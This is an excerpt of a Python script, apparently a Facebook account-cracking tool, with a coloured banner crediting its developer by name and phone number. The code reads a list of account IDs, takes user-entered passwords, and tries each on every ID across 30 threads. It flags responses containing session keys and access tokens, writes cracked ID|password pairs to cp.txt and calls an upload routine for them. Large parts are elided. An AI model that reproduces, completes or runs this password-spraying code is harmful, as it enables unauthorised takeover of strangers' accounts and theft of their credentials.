...
\033[31;1m| $$  | $$| $$  | $$| $$      | $$| $$  | $$| $$  | $$
\033[31;1m| $$$$$$$/|  $$$$$$/| $$      | $$|  $$$$$$/|  $$$$$$$
\033[31;1m|_______/  \______/ |__/      | $$ \______/  \____  $$
                       \033[31;1m  /$$  | $$           /$$  | $$
                   \033[31;1m     |  $$$$$$/          |  $$$$$$/
                      \033[31;1m   \______/            \______/ 

\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            DURJOY
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Durjoy Ahmed Joy
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01756909615
     \033[1;96m➣ \033[1;92mGITHUB     :           durjoy
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR DURJOY  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [DRJOY] : \033[0;97m %s/%s -> \033[0;92m [DURJOY -OK:%s ]- \033[0;93m[DURJOY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
    ...
    'viewport-width': '980',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[DURJOY-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [DURJOY-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
